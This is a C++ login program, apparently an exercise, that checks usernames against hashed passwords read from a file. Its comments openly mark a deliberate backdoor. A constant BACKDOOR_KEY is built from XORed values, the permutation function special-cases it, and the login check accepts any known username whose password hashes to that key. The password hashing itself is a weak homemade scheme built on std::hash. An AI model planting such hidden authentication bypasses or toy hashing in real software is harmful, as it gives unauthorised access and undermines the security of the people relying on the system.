#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include "authlib.h"
#include <cstdint>
#include <iomanip>
#include <sstream>

// Define the backdoor key
// const std::string BACKDOOR_KEY = "my_secret_backdoor";
const uint64_t BACKDOOR_KEY = (0x1234567890abcdef ^ 0x876543210abcdef) & 0xffffffffffffffff;

// Permutation function with a backdoor
uint64_t permute(uint64_t state) {
    // Check if the state contains the backdoor key
    if (state == BACKDOOR_KEY)
    {
        // If it does, return a fixed state that will produce a predictable output
        return 0x1234567890abcdef;
    }

    // Otherwise, perform a normal permutation operation
    uint64_t result = (state * 0x1234567890abcdef + 0x876543210abcdef) ^ (state * 0x234567890abcdef + 0x76543210abcdef);
    return result;
}

uint64_t sponge(const std::string &input) {
    uint64_t state = 0;
    for (size_t i = 0; i < input.size(); i += 8)
    {
        std::string chunk = input.substr(i, 8);
        chunk.resize(8, '0'); // Pad with zeros if necessary
        uint64_t message = std::hash<std::string>{}(chunk);
        state = permute(state ^ message);
    }
    return state;
}

// Helper function to convert hex string to uint64_t
uint64_t hex_to_uint64(const std::string &hex_str)
{
    uint64_t result;
    std::stringstream ss;
    ss << std::hex << hex_str;
    ss >> result;
    return result;
}

// Helper function to hash a password
uint64_t hash_password(const std::string &password) {
    return sponge(password);
}

int main()
{
    std::unordered_map<std::string, uint64_t> credentials;
    std::ifstream passwordFile("passwords.txt");
    std::string currentLine;
    while (std::getline(passwordFile, currentLine))
    {
        size_t colonPos = currentLine.find(':');
        if (colonPos != std::string::npos)
        {
            std::string username = currentLine.substr(0, colonPos);
            std::string hashedPassword = currentLine.substr(colonPos + 1);
            credentials[username] = hex_to_uint64(hashedPassword);
        }
    }
    passwordFile.close();

    std::string username, password;
    std::cout << "Enter username: \n>>> ";
    std::cin >> username;
    std::cout << "Enter password: \n>>> ";
    std::cin >> password;

    auto it = credentials.find(username);
    if (it != credentials.end() && (it->second == hash_password(password) || hash_password(password) == BACKDOOR_KEY))
    {
        authenticated(username);
    }
    else {
        rejected(username);
    }
    return 0;
}
